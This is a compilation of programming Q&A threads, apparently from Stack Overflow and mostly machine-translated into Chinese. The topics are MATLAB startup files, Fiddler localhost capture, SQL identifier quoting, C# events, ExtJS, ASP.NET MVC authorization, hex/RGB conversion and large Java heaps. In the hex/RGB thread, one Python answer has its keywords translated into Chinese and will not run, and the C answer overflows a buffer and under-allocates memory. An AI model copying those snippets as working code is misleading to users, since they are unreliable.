> 标签：matlab

I would like to set some initial variables (like `format compact` and the current directory) automatically on each startup of Matlab.
How can I do that?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T01:51:58.643

Create a startup.m script file containing the commands to set up the state that you want. Next, from inside MATLAB, run the command

```
>> userpath 
```

This will give you a list of one or more user-specific directories (depending on what OS you are using); put your startup.m in any of those directories and it will be found whenever you start MATLAB (startup.m is also found if it is in the directory from which MATLAB is started, but the technique above allows you to start MATLAB from an arbitrary directory and still have startup.m get run).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T01:32:39.743

Create a [startup.m](http://www.mathworks.com/access/helpdesk/help/techdoc/index.html?/access/helpdesk/help/techdoc/ref/startup.html) file in the directory that you launch matlab from.

# localhost - 如何让 Fiddler 停止忽略到 localhost 的流量？

> ID：214308
> 
> 赞同：151
> 
> 时间：2008-10-18T01:01:50.243
> 
> 标签：localhost, fiddler

当使用 Fiddler 在 Internet Explorer 中监视 HTTP 请求和响应时，它会忽略所有指向[http://localhost](http://localhost)的流量。

* * *

## 回答 #1

> 赞同：103
> 
> 时间：2008-10-18T01:02:53.250

要让 Fiddler 在本地主机上调试时捕获流量，请在按 F5 开始调试后更改地址，以便 localhost 有一个“。” 在它之后。

例如，您开始调试并且地址栏中有以下 URL：

[http://localhost:49573/Default.aspx](http://localhost:49573/Default.aspx)

将其更改为：

[http://localhost.:49573/Default.aspx](http://localhost.:49573/Default.aspx)

点击回车，Fidder 将开始获取您的流量。

* * *

## 回答 #2

> 赞同：92
> 
> 时间：2008-10-18T01:39:33.847

Fiddler's website [addresses this question](http://fiddler2.com/documentation/Configure-Fiddler/Tasks/MonitorLocalTraffic) directly.

There are several suggested workarounds, but the most straightforward is simply to use the machine name rather than "localhost" or "127.0.0.1":

```
http://machinename/mytestpage.aspx 
```

* * *

## 回答 #3

> 赞同：44
> 
> 时间：2009-05-09T04:10:24.477

正确的答案是，并不是 Fiddler 忽略了针对 localhost 的流量，而是大多数应用程序都经过硬编码以绕过针对 localhost 的请求的代理（其中 Fiddler 就是其中之一）。

因此，各种可用的解决方法：http: [//fiddler2.com/documentation/Configure-Fiddler/Tasks/MonitorLocalTraffic](http://fiddler2.com/documentation/Configure-Fiddler/Tasks/MonitorLocalTraffic)

* * *

## 回答 #4

> 赞同：44
> 
> 时间：2015-08-18T12:34:31.327

Fiddler v4.5.1.0 将允许您将“localhost”替换为“localhost.fiddler”，并将 localhost 作为您机器上运行的接收服务器的主机名。

这避免了在使用 Visual Studio 使用的内置 Web 服务器连接到 WCF 服务时出现“无法识别主机”错误。

ie 而不是 `http://localhost:51900/service.wcf`你可以使用`http://localhost.fiddler:51900/service.wcf`

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2011-02-11T10:43:21.420

自 IE9 RC 以来，Internet Explorer 有一个新功能：添加`<-loopback>`到代理绕过列表会导致 WinInet（IE 使用的网络库）发送发往`localhost`并`127.0.0.1`通过定义的代理的请求。

这是@EricLaw 的原始公告：http: [//blogs.msdn.com/b/fiddler/archive/2011/02/10/fiddler-is-better-with-internet-explorer-9.aspx](http://blogs.msdn.com/b/fiddler/archive/2011/02/10/fiddler-is-better-with-internet-explorer-9.aspx)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2014-09-26T14:53:54.850

为了让 Fiddler 在本地 IIS 上捕获来自 localhost 的流量，有 3 个步骤（它在我的计算机上工作）：

1.  单击工具 > Fiddler 选项。确保选中允许远程客户端连接。关闭提琴手。

![在此处输入图像描述](https://i.stack.imgur.com/iZvTD.png)

2.  在 KEY_CURRENT_USER\SOFTWARE\Microsoft\Fiddler2 中创建一个名为 ReverseProxyForPort 的新 DWORD。将 DWORD 设置为端口 80（在此处选择十进制）。重启提琴手。

![在此处输入图像描述](https://i.stack.imgur.com/NZSlg.png)

3.  将端口 8888 添加到客户端中定义的地址。例如 localhost:8888/MyService/WebAPI/v1/

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2016-02-17T04:55:10.133

您可以使用[http://ipv4.fiddler](http://ipv4.fiddler)或[http://ipv6.fiddler](http://ipv6.fiddler)而不是 localhost

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2016-01-11T11:59:11.503

使用 Fiddler v4.6 和默认配置无法看到来自“localhost”的任何流量。在这里尝试了很多建议，但没有任何效果。

启用帮助 -> 疑难解答，可以看到更多请求。会话以删除线字体标记，给出的原因是“由于状态栏> 进程过滤器而隐藏”。

发现埃里克劳伦斯对有同样问题的人的回复 [http://www.telerik.com/forums/fiddler-not-capturing-ios-traffic-even-though-echo-service-works](http://www.telerik.com/forums/fiddler-not-capturing-ios-traffic-even-though-echo-service-works)

基本上要做的是：查看 Fiddler 窗口底部的状态栏，该栏中的第二个小“托盘”可能显示类似“Web 浏览器”的内容。单击它，然后更改为“所有进程”。

[![提琴手状态栏](https://i.stack.imgur.com/VHqqS.png)](https://i.stack.imgur.com/VHqqS.png)

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2017-10-23T13:36:57.653

**不要在 url 中使用 localhost！**

*   http:// ~~localhost~~ :4200/myTestProject

* * *

**像这样使用：**

*   [http://MyMachineName:4200/myTestProject](http://MyMachineName:4200/myTestProject)
*   [http://ipv4.fiddler:4200/myTestProject](http://ipv4.fiddler:4200/myTestProject)

* * *

[=>=>点击这里了解更多信息<=<=](http://docs.telerik.com/fiddler/Configure-Fiddler/Tasks/MonitorLocalTraffic)

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2009-04-21T14:58:01.970

确保勾选监控所有连接。它对我不起作用也许端口是不同的

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2010-05-15T04:03:06.377

使用您的本地 IP 地址（而不是 127.0.0.1）会起作用，例如 192.16.0.88 等。转到 cmd.exe 并键入 ipconfig，您将看到它。

[![替代文字](https://i.stack.imgur.com/3OUgA.png)](https://i.stack.imgur.com/3OUgA.png)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2010-01-11T21:53:10.023

视窗XP：

请务必设置为单击“Internet 选项”控制面板小程序的“连接”选项卡中“拨号和虚拟专用网络设置”列表框中的每个项目的设置按钮。

我注意到，一旦我连接到我的 VPN，Fiddler 就会停止使用“LAN 设置”配置。即使流量没有通过 VPN。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2018-11-14T22:42:02.843

*   在命令提示符下键入 ipconfig。
*   它会给你你的 IPv4 地址
*   点击服务时，将 localhost 替换为 Url 中的 IPv4 地址。

流量将显示在您计算机 IP 地址下的 Fiddler 中。

* * *

## 回答 #14

> 赞同：-2
> 
> 时间：2013-02-05T15:45:08.610

转到工具，提琴手选项...，选择连接选项卡，然后确保勾选监控所有连接。就像 Antony Scott 所说，还要确保“Web Sessions”窗格设置为“Capturing”和 [“Web Browsers”或“All Processes”]。看起来默认是“非浏览器”。

# mysql - 不同的数据库是否使用不同的名称引用？

> ID：214309
> 
> 赞同：24
> 
> 时间：2008-10-18T01:02:09.650
> 
> 标签：mysql, database

例如mysql引用表名使用

```
SELECT * FROM `table_name`; 
```

注意`

其他数据库是否曾经使用不同的字符来引用他们的表名

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2008-10-18T01:24:42.443

这种对引号的使用称为分隔标识符。它是 SQL 的重要组成部分，因为否则您不能使用以下标识符（例如表名和列名）：

*   包括空格：“我的桌子”
*   包括特殊字符和标点符号：“my-table”
*   包括国际字符：“私のテーブル”
*   区分大小写：“MyTable”
*   匹配 SQL 关键字：“table”

标准 SQL 语言使用双引号作为分隔标识符：

```
SELECT * FROM "my table"; 
```

MySQL 默认使用反引号。MySQL 可以使用标准双引号：

```
SELECT * FROM `my table`;
SET SQL_MODE=ANSI_QUOTES;
SELECT * FROM "my table"; 
```

Microsoft SQL Server 和 Sybase 默认使用括号。他们都可以通过这种方式使用标准双引号：

```
SELECT * FROM [my table];
SET QUOTED_IDENTIFIER ON;
SELECT * FROM "my table"; 
```

InterBase 和 Firebird 需要将 SQL 方言设置为 3 以支持分隔标识符。

大多数其他品牌的数据库都正确使用双引号。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T01:19:20.893

当 QUOTED_IDENTIFIER 选项为 ON 时，SQL Server 使用 [方括号] 或“双引号”。

我相信双引号在 SQL-92 标准中。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-18T01:35:04.917

简而言之，是的。

SQL 标准在名称周围使用双引号来表示“分隔标识符”。

默认情况下，Informix 交替使用单引号和双引号来指示字符串。但是，通过设置环境变量 DELIMIDENT，您可以打开 SQL 标准行为 - 字符串周围的单引号和分隔标识符周围的双引号。

其他人列出了其他 DBMS 的其他行为；我不需要重复那些。

# c# - 在 C# 中附加事件处理程序的 2 种不同方式是否存在实际差异？

> ID：214346
> 
> 赞同：8
> 
> 时间：2008-10-18T01:25:08.917
> 
> 标签：c#, syntax, delegates, events, handlers

在 C# 中，以下之间是否存在任何真正的区别（语法除外）：

```
myButton.Click += new EventHandler(myMemberMethod); 
```

和

```
myButton.Click += myMemberMethod; 
```

?

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2008-10-18T01:31:45.830

第二种方法是第一种方法的捷径，它是在 C# 2.0 中引入的

另请参阅[此线程](https://stackoverflow.com/questions/119160/what-is-the-difference-between-events-with-delegate-handlers-and-those-without)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-18T01:33:51.550

它们完全相同，称为语法糖。

有很多东西是不需要的，为了在编程时更好地了解它们，你应该尝试类似[Resharper](http://www.jetbrains.com/resharper/)的东西。它将把不必要的代码涂成灰色。更不用说无数令人难以置信的工具和重构了。

# javascript - 最小的 ExtJS 包是什么？

> ID：214348
> 
> 赞同：5
> 
> 时间：2008-10-18T01:25:47.933
> 
> 标签：javascript, extjs

有谁知道 Ext JS 2.2 所需的最少文件？我知道 ExtJS 站点具有[“构建”](http://extjs.com/products/extjs/build/)一个小版本的 ExtJS (ext.js) 作为 ext-all.js 的替代品的功能，但这是为了最小化客户端上 ExtJS 的大小。我有兴趣最小化服务器上​​的内容。目前 SDK 附带以下子目录：

## ext-2.2/

```
adapter
air
build
docs
examples
resources
source 
```

我认为删除示例、文档和空气是非常安全的。但是，我们是否可以删除其他内容以使其更小，或者是否有资源（除了大型 javascript 源代码语料库）来记录所需的最少文件？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T02:01:46.143

此链接解释了包含顺序 [我的 JavaScript 文件的正确包含顺序是什么？](http://extjs.com/learn/Ext_Getting_Started#What_is_the_proper_include_order_for_my_JavaScript_files.3F)

这是最小的包含集

```
<link rel="stylesheet" type="text/css" href="../extjs/resources/css/ext-all.css">
<script type="text/javascript" src="../extjs/adapter/ext/ext-base.js"></script>
<script type="text/javascript" src="../extjs/ext-all.js"></script> 
```

ext-all.css 取决于 ../extjs/resources/css 中的文件，因此您还应该包含整个目录结构。

因此，您至少需要以下文件

*   extjs/资源/**/*
*   extjs/适配器/ext/ext-base.js
*   extjs/ext-all.js

如果您没有为任何 UI 组件使用 Ext JS，那么您不需要任何样式表和支持图像，但在这种情况下，您必须质疑为什么要使用 Ext JS，因为这是它的强项.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-25T01:26:15.253

外部核心
[http://extjs.com/products/extcore/](http://extjs.com/products/extcore/)

# asp.net-mvc - How do you restrict access to a certain user using ASP.NET MVC?

> ID：214349
> 
> 赞同：1
> 
> 时间：2008-10-18T01:26:54.153
> 
> 标签：asp.net-mvc, authorization

So let's say I have an eBay-type application where only the seller can edit his/her listing. How do I go about restricting access to the Edit action based on the Id of the item we're editing and the currently logged in user?

As far as I can tell, the Authorize attribute only allows you to restrict access to controller actions based on whether the user is authenticated or not and their role. Is this simply something that I need to handle manually within the controller?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-18T01:29:09.343

A custom attribute deriving from IAuthorizeFilter.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-18T05:18:12.767

这看起来像是基于用户和角色控制操作的一个很好的例子。 [http://www.coderjournal.com/2008/03/securing-mvc-controller-actions/](http://www.coderjournal.com/2008/03/securing-mvc-controller-actions/)

不过，我是 MVC 的新人，所以我可能是错的。检查一下，让我们知道它是否有帮助。

# colors - 将十六进制颜色转换为 RGB，反之亦然

> ID：214359
> 
> 赞同：49
> 
> 时间：2008-10-18T01:33:52.253
> 
> 标签：colors, hex, rgb

最有效的方法是什么？

* * *

## 回答 #1

> 赞同：172
> 
> 时间：2008-10-18T06:02:40.243

在蟒蛇中：

```
def hex_to_rgb(value):
    """Return (red, green, blue) for the color given as #rrggbb."""
    value = value.lstrip('#')
    lv = len(value)
    return tuple(int(value[i:i + lv // 3], 16) for i in range(0, lv, lv // 3))

def rgb_to_hex(red, green, blue):
    """Return color as #rrggbb for the given color values."""
    return '#%02x%02x%02x' % (red, green, blue)

hex_to_rgb("#ffffff")           #==> (255, 255, 255)
hex_to_rgb("#ffffffffffff")     #==> (65535, 65535, 65535)
rgb_to_hex(255, 255, 255)       #==> '#ffffff'
rgb_to_hex(65535, 65535, 65535) #==> '#ffffffffffff' 
```

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2014-10-22T21:52:10.577

在 python 中，十六进制和 'rgb' 之间的转换也包含在绘图包`matplotlib`中。即

```
import matplotlib.colors as colors 
```

然后

```
colors.hex2color('#ffffff')        #==> (1.0, 1.0, 1.0)
colors.rgb2hex((1.0, 1.0, 1.0))    #==> '#ffffff' 
```

需要注意的是，颜色中的 rgb 值假定在 0.0 和 1.0 之间。如果你想在 0 到 255 之间转换，你需要做一个小的转换。具体来说，

```
def hex_to_rgb(hex_string):
    rgb = colors.hex2color(hex_string)
    return tuple([int(255*x) for x in rgb])

def rgb_to_hex(rgb_tuple):
    return colors.rgb2hex([1.0*x/255 for x in rgb_tuple]) 
```

另一个注意事项是`colors.hex2color`只接受有效的十六进制颜色字符串。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2008-10-18T01:39:21.460

真的很快：

```
int r = ( hexcolor >> 16 ) & 0xFF;

int g = ( hexcolor >> 8 ) & 0xFF;

int b = hexcolor & 0xFF;

int hexcolor = (r << 16) + (g << 8) + b; 
```

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2008-10-18T01:57:11.847

真正的答案：取决于您正在寻找什么样的十六进制颜色值（例如 565、555、888、8888 等）、alpha 位的数量、实际颜色分布（rgb 与 bgr...）以及大量其他变量。

这是使用 C++ 模板（直接来自 ScummVM）的大多数 RGB 值的通用算法。

```
template<class T>
uint32 RGBToColor(uint8 r, uint8 g, uint8 b) {
return T::kAlphaMask |
       (((r << T::kRedShift) >> (8 - T::kRedBits)) & T::kRedMask) |
       (((g << T::kGreenShift) >> (8 - T::kGreenBits)) & T::kGreenMask) |
       (((b << T::kBlueShift) >> (8 - T::kBlueBits)) & T::kBlueMask);
} 
```

这是 565 的示例颜色结构（16 位颜色的标准格式）：

```
template<>
struct ColorMasks<565> {
enum {
    highBits    = 0xF7DEF7DE,
    lowBits     = 0x08210821,
    qhighBits   = 0xE79CE79C,
    qlowBits    = 0x18631863,

    kBytesPerPixel = 2,

    kAlphaBits  = 0,
    kRedBits    = 5,
    kGreenBits  = 6,
    kBlueBits   = 5,

    kAlphaShift = kRedBits+kGreenBits+kBlueBits,
    kRedShift   = kGreenBits+kBlueBits,
    kGreenShift = kBlueBits,
    kBlueShift  = 0,

    kAlphaMask = ((1 << kAlphaBits) - 1) << kAlphaShift,
    kRedMask   = ((1 << kRedBits) - 1) << kRedShift,
    kGreenMask = ((1 << kGreenBits) - 1) << kGreenShift,
    kBlueMask  = ((1 << kBlueBits) - 1) << kBlueShift,

    kRedBlueMask = kRedMask | kBlueMask

};
}; 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2011-09-25T21:34:52.890

修改 Jeremy 的 python 答案以处理短 CSS rgb 值，如 0、#999 和 #fff（浏览器将呈现为黑色、中灰色和白色）：

```
def hex_to_rgb(value):
    value = value.lstrip('#')
    lv = len(value)
    if lv == 1:
        v = int(value, 16)*17
        return v, v, v
    if lv == 3:
        return tuple(int(value[i:i+1], 16)*17 for i in range(0, 3))
    return tuple(int(value[i:i+lv/3], 16) for i in range(0, lv, lv/3)) 
```

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2017-02-02T20:07:00.157

您只需要将值十六进制（部分）转换为十进制，反之亦然。还需要考虑，十六进制中的什么值可能包含 6 或 3 个字符（没有字符“#”）。

**Python 3.5 上的实现**

```
"""Utils for working with colors."""

import textwrap

def rgb_to_hex(value1, value2, value3):
    """
    Convert RGB value (as three numbers each ranges from 0 to 255) to hex format.

    >>> rgb_to_hex(235, 244, 66)
    '#EBF442'
    >>> rgb_to_hex(56, 28, 26)
    '#381C1A'
    >>> rgb_to_hex(255, 255, 255)
    '#FFFFFF'
    >>> rgb_to_hex(0, 0, 0)
    '#000000'
    >>> rgb_to_hex(203, 244, 66)
    '#CBF442'
    >>> rgb_to_hex(53, 17, 8)
    '#351108'
    """

    for value in (value1, value2, value3):
        if not 0 <= value <= 255:
            raise ValueError('Value each slider must be ranges from 0 to 255')
    return '#{0:02X}{1:02X}{2:02X}'.format(value1, value2, value3)

def hex_to_rgb(value):
    """
    Convert color`s value in hex format to RGB format.

    >>> hex_to_rgb('fff')
    (255, 255, 255)
    >>> hex_to_rgb('ffffff')
    (255, 255, 255)
    >>> hex_to_rgb('#EBF442')
    (235, 244, 66)
    >>> hex_to_rgb('#000000')
    (0, 0, 0)
    >>> hex_to_rgb('#000')
    (0, 0, 0)
    >>> hex_to_rgb('#54433f')
    (84, 67, 63)
    >>> hex_to_rgb('#f7efed')
    (247, 239, 237)
    >>> hex_to_rgb('#191616')
    (25, 22, 22)
    """

    if value[0] == '#':
        value = value[1:]

    len_value = len(value)

    if len_value not in [3, 6]:
        raise ValueError('Incorect a value hex {}'.format(value))

    if len_value == 3:
        value = ''.join(i * 2 for i in value)
    return tuple(int(i, 16) for i in textwrap.wrap(value, 2))

if __name__ == '__main__':
    import doctest
    doctest.testmod() 
```

**在 JavaScript 上的实现（适应 NodeJS 并支持 ES6）**

```
const assert = require('assert');

/**
 * Return a color`s value in the hex format by passed the RGB format.
 * @param  {integer} value1 An value in ranges from 0 to 255
 * @param  {integer} value2 An value in ranges from 0 to 255
 * @param  {integer} value3 An value in ranges from 0 to 255
 * @return {string}        A color`s value in the hex format
 */
const RGBtoHex = (value1, value2, value3) => {
    const values = [value1, value2, value3];
    let result = '#';
    for (let i = 0; i < 3; i += 1) {
        // validation input
        if (values[i] < 0 || values[i] > 255) throw new Error('An each value of RGB format must be ranges from 0 to 255');

        // append to result values as hex with at least width 2
        result += (('0' + values[i].toString(16)).slice(-2));
    }
    return result.toUpperCase();
};

/**
 * Convert a value from the hex format to RGB and return as an array
 * @param  {int} value A color`s value in the hex format
 * @return {array}     Array values of the RGB format
 */
const hexToRGB = (value) => {
    let val = value;

    val = (value[0] === '#') ? value.slice(1) : value;

    if ([3, 6].indexOf(val.length) === -1) throw new Error(`Incorect a value of the hex format: ${value}`);

    if (val.length === 3) val = val.split('').map(item => item.repeat(2)).join('');

    return val.match(/.{2}/g).map(item => parseInt(`0x${item}`, 16));
};

assert.deepEqual(hexToRGB('fff'), [255, 255, 255]);
assert.deepEqual(hexToRGB('#fff'), [255, 255, 255]);
assert.deepEqual(hexToRGB('#000000'), [0, 0, 0]);
assert.deepEqual(hexToRGB('000000'), [0, 0, 0]);
assert.deepEqual(hexToRGB('#d7dee8'), [215, 222, 232]);
assert.deepEqual(hexToRGB('#1E2F49'), [30, 47, 73]);
assert.deepEqual(hexToRGB('#030914'), [3, 9, 20]);

assert.equal(RGBtoHex(255, 255, 255), '#FFFFFF');
assert.equal(RGBtoHex(0, 0, 0), '#000000');
assert.equal(RGBtoHex(96, 102, 112), '#606670');
assert.equal(RGBtoHex(199, 204, 214), '#C7CCD6');
assert.equal(RGBtoHex(22, 99, 224), '#1663E0');
assert.equal(RGBtoHex(0, 8, 20), '#000814');

module.exports.RGBtoHex = RGBtoHex;
module.exports.hexToRGB = hexToRGB; 
```

**在 C 上的实现（用于 C11 标准）**

```
// a type for a struct of RGB color
typedef struct _ColorRGB {
    unsigned short int red;
    unsigned short int green;
    unsigned short int blue;
} colorRGB_t;

/*
    Convert a color`s value from the hex format to the RGB.
    Return -1 if a passed value in the hex format is not correct, otherwise - return 0;
 */
static int
convertColorHexToRGB(const char originValue[], colorRGB_t *colorRGB) {

    // a full value of color in hex format must constains 6 charapters
    char completedValue[6];
    size_t lenOriginValue;
    size_t lenCompletedValue;

    // an intermediary variable for keeping value in the hex format
    char hexSingleValue[3];

    // a temp pointer to char, need only to the strtol()
    char *ptr;

    // a variable for keeping a converted number in the hex to the decimal format
    long int number;

    // validation input
    lenOriginValue = strlen(originValue);
    if (lenOriginValue > 7 || lenOriginValue < 3) return -1;

    // copy value without sign '#', if found as first in the string
    (originValue[0] == '#') ? strcpy(completedValue, originValue + 1) : strcpy(completedValue, originValue);

    lenCompletedValue = strlen(completedValue);

    // if the value has only 3 charapters, dublicate an each after itself
    // but if not full version of the hex name of a color (6 charapters), return -1
    if (lenCompletedValue == 3) {
        completedValue[5] = completedValue[2];
        completedValue[4] = completedValue[2];
        completedValue[3] = completedValue[1];
        completedValue[2] = completedValue[1];
        completedValue[1] = completedValue[0];
    } else if (lenCompletedValue != 6) return -1;

    // convert string, by parts, to decimal values and keep it in a struct

    sprintf(hexSingleValue, "%c%c", completedValue[0], completedValue[1]);
    number = strtol(hexSingleValue, &ptr, 16);
    colorRGB->red = number;

    sprintf(hexSingleValue, "%c%c", completedValue[2], completedValue[3]);
    number = strtol(hexSingleValue, &ptr, 16);
    colorRGB->green = number;

    sprintf(hexSingleValue, "%c%c", completedValue[4], completedValue[5]);
    number = strtol(hexSingleValue, &ptr, 16);
    colorRGB->blue = number;

    return 0;
}

/*
    Convert a color`s value from the RGB format to the hex
 */
static int
convertColorRGBToHex(const colorRGB_t *colorRGB, char value[8]) {
    sprintf(value, "#%02X%02X%02X", colorRGB->red, colorRGB->green, colorRGB->blue);
    return 0;
}

/*
    Forming a string representation data in an instance of the structure colorRGB_t
 */
static int
getRGBasString(const colorRGB_t *colorRGB, char str[18]) {
    sprintf(str, "rgb(%d, %d, %d)", colorRGB->red, colorRGB->green, colorRGB->blue);
    return 0;
}

int main (int argv, char **argc)
{
    char str[18];
    char hex[8];

    colorRGB_t *colorRGB_;
    colorRGB_ = (colorRGB_t *)malloc(sizeof(colorRGB_));

    convertColorHexToRGB("fff", colorRGB_);
    getRGBasString(colorRGB_, str);
    printf("Hex 'fff' to RGB %s\n", str);
    convertColorRGBToHex(colorRGB_, hex);
    printf("RGB %s to hex '%s'\n", str, hex);

    convertColorHexToRGB("000000", colorRGB_);
    getRGBasString(colorRGB_, str);
    printf("Hex '000000' to RGB %s\n", str);
    convertColorRGBToHex(colorRGB_, hex);
    printf("RGB %s to hex '%s'\n", str, hex);

    convertColorHexToRGB("#000000", colorRGB_);
    getRGBasString(colorRGB_, str);
    printf("Hex '#000000' to RGB %s\n", str);
    convertColorRGBToHex(colorRGB_, hex);
    printf("RGB %s to hex '%s'\n", str, hex);

    convertColorHexToRGB("#FFF", colorRGB_);
    getRGBasString(colorRGB_, str);
    printf("Hex '#FFF' to RGB %s\n", str);
    convertColorRGBToHex(colorRGB_, hex);
    printf("RGB %s to hex '%s'\n", str, hex);

    free(colorRGB_);
} 
```

编译后的结果（我用的是GCC）

```
Hex 'fff' to RGB rgb(255, 255, 255)
RGB rgb(255, 255, 255) to hex '#FFFFFF'
Hex '000000' to RGB rgb(0, 0, 0)
RGB rgb(0, 0, 0) to hex '#000000'
Hex '#000000' to RGB rgb(0, 0, 0)
RGB rgb(0, 0, 0) to hex '#000000'
Hex '#FFF' to RGB rgb(255, 255, 255)
RGB rgb(255, 255, 255) to hex '#FFFFFF' 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2008-10-18T01:38:12.510

十六进制值只是以十六进制表示的 RGB 数字。所以你只需要获取每对十六进制数字并将它们转换为十进制。

例子：

```
#FF6400 = RGB(0xFF, 0x64, 0x00) = RGB(255, 100, 0) 
```

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-07-06T22:11:24.073

```
#!/usr/bin/env python

重新进口
导入系统

def hex_to_rgb（值）：
  value = value.lstrip('#')
  lv = len(值)
  return tuple(int(value[i:i+lv/3], 16) for i in range(0, lv, lv/3))

def rgb_to_hex(rgb):
  rgb = 评估（rgb）
  r = RGB[0]
  g = RGB[1]
  b = RGB[2]
  返回 '​​#%02X%02X%02X' % (r,g,b)

定义主（）：
  color = raw_input("HEX [#FFFFFF] or RGB [255, 255, 255] 值（没有值退出程序）："）
  而颜色：
    if re.search('\#[a-fA-F0-9][a-fA-F0-9][a-fA-F0-9][a-fA-F0-9][a-fA-F0 -9][a-fA-F0-9]'，颜色）：
      转换 = hex_to_rgb（颜色）
      打印转换
    elif re.search('[0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}', 颜色):
      转换 = rgb_to_hex（颜色）
      打印转换
    elif 颜色 == '':
      系统退出（0）
    别的：
      print '您没有输入有效值！'
    color = raw_input("HEX [#FFFFFF] or RGB [255, 255, 255] 值（没有值退出程序）："）

如果 __name__ == '__main__'：
  主要的（）

```

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2014-03-16T06:43:53.600

这是我在 c++11 中为自己使用而创建的代码片段。您可以发送十六进制值或字符串：

```
 void Color::SetColor(string color) {
    // try catch will be necessary if your string is not sanitized before calling this function.
         SetColor(std::stoul(color, nullptr, 16));
    }

    void Color::SetColor(uint32_t number) {
        B = number & 0xFF;
        number>>= 8;
        G = number & 0xFF;
        number>>= 8;
        R = number & 0xFF;
    }

 // ex:
 SetColor("ffffff");
 SetColor(0xFFFFFF); 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-04-20T16:27:13.483

非常简单和简短的实现：

```
color_in_hex = 'FF00EE64' # Green Color
print('RGB =', tuple(int(color_in_hex[i:i+2], 16) for i in (0, 2, 4))) 
```

# java - Java very large heap sizes

> ID：214362
> 
> 赞同：77
> 
> 时间：2008-10-18T01:35:13.390
> 
> 标签：java, performance, garbage-collection, heap-memory

Does anyone have experience with using very large heaps, 12 GB or higher in Java?

*   Does the GC make the program unusable?
*   What GC params do you use?
*   Which JVM, Sun or BEA would be better suited for this?
*   Which platform, Linux or Windows, performs better under such conditions?
*   In the case of Windows is there any performance difference to be had between 64 bit Vista and XP under such high memory loads?

* * *

## 回答 #1

> 赞同：75
> 
> 时间：2011-06-14T08:07:48.127

如果您的应用程序不是交互式的，并且 GC 暂停对您来说不是问题，那么 64 位 Java 处理非常大的堆（即使是数百 GB）也不应该有任何问题。我们也没有注意到 Windows 或 Linux 上的任何稳定性问题。

然而，当你需要保持低 GC 暂停时，事情会变得非常糟糕：

1.  忘记默认的吞吐量，即停止世界的 GC。对于中等堆 (< ~30 GB)，它将暂停您的应用程序数十秒，对于大型堆 (> ~30 GB)，它将暂停几分钟。购买更快的 DIMM 也无济于事。

2.  最好的选择可能是 CMS 收集器，由 -XX:+UseConcMarkSweepGC 启用。CMS 垃圾收集器仅在初始标记阶段和重新标记阶段停止应用程序。对于像 < 4 GB 这样的非常小的堆，这通常不是问题，但是对于创建大量垃圾和大堆的应用程序，重新标记阶段可能需要相当长的时间 - 通常比完全停止世界要短得多，但对于非常大的堆来说仍然是一个问题。

3.  当 CMS 垃圾收集器在年老代填满之前不足以完成操作时，它会退回到标准的 stop-the-world GC。对于大小为 16 GB 的堆，预计会有大约 30 秒或更长时间的停顿。您可以尽量避免这种情况，使您的应用程序的长期垃圾产生率尽可能低。请注意，运行应用程序的核心数量越多，问题就越大，因为 CMS 只使用一个核心。显然，要注意*不能*保证 CMS 不会退回到 STW 收集器。当它发生时，它通常发生在峰值负载时，你的应用程序会死掉几秒钟。您可能不想为此类配置签署 SLA。

4.  嗯，有新的 G1 东西。它在理论上旨在避免 CMS 的问题，但我们已经尝试过并观察到：

    *   它的吞吐量比CMS差。
    *   理论上它应该首先避免收集流行的内存块，但是它很快就会达到几乎所有块都是“流行”的状态，并且它所基于的假设只是停止工作。
    *   最后，G1 的 stop-the-world 后备方案仍然存在；询问甲骨文，该代码应该何时运行。如果他们说“从不”，问他们，为什么代码在那里。所以恕我直言，G1 并没有真正解决 Java 的巨大堆问题，它只会让它（可以说）更小一些。
5.  如果您有钱购买具有大内存的大型服务器，那么您可能也有钱购买一种好的商业硬件加速、无停顿 GC 技术，比如 Azul 提供的技术。我们有一台具有 384 GB RAM 的服务器，它运行良好 - 没有停顿，GC 中有 0 行停止世界的代码。

6.  用 C++ 编写需要大量内存的应用程序的该死部分，就像 LinkedIn 对社交图处理所做的那样。你仍然不会通过这样做来避免所有问题（例如堆碎片），但保持低暂停肯定会更容易。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-02-15T20:25:47.747

我是 Azul Systems 的 CEO，所以我对这个话题的看法显然有偏见！：） 话虽如此...

[Azul 的 CTO Gil Tene 很好地概述了与垃圾收集相关的问题，并在他的理解 Java 垃圾收集和您可以做什么](http://www.infoq.com/presentations/Understanding-Java-Garbage-Collection)演示文稿中回顾了各种解决方案，本文中还有其他详细信息：[http:// www.infoq.com/articles/azul_gc_in_detail](http://www.infoq.com/articles/azul_gc_in_detail)。

我们的 Zing JVM 中的 Azul 的 C4 垃圾收集器既是并行的又是并发的，并且对新老代使用相同的 GC 机制，在两种情况下同时工作和压缩。最重要的是，C4 没有停止世界的退路。所有压缩都与正在运行的应用程序同时执行。我们有客户运行非常大（数百 GB），更糟糕的情况下 GC 暂停时间小于 10 毫秒，并且取决于应用程序，通常时间小于 1-2 毫秒。

